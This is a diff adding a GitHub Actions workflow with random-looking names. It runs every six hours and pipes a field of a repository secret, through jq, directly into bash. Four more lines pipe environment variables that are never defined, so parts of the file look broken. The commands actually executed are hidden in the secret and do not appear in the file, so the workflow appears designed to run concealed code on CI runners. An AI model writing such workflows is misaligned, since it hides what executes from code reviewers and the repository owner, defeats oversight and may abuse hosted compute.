@@ -1,0 +1,22 @@
+name: yugmaodegou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yugmaodegou
+        env:
+          gxsj94485: ${{ secrets.gxsj94485 }}
+        run: |
+          echo $gxsj94485 | jq -r .ccvqb000 | /bin/bash
+          echo $pxdvw42975 | jq -r .nvmgd8 | /bin/bash
+          echo $exo8 | jq -r .th6406 | /bin/bash
+          echo $iox33 | jq -r .jgmd148 | /bin/bash
+          echo $p0572 | jq -r .nabin512 | /bin/bash
+
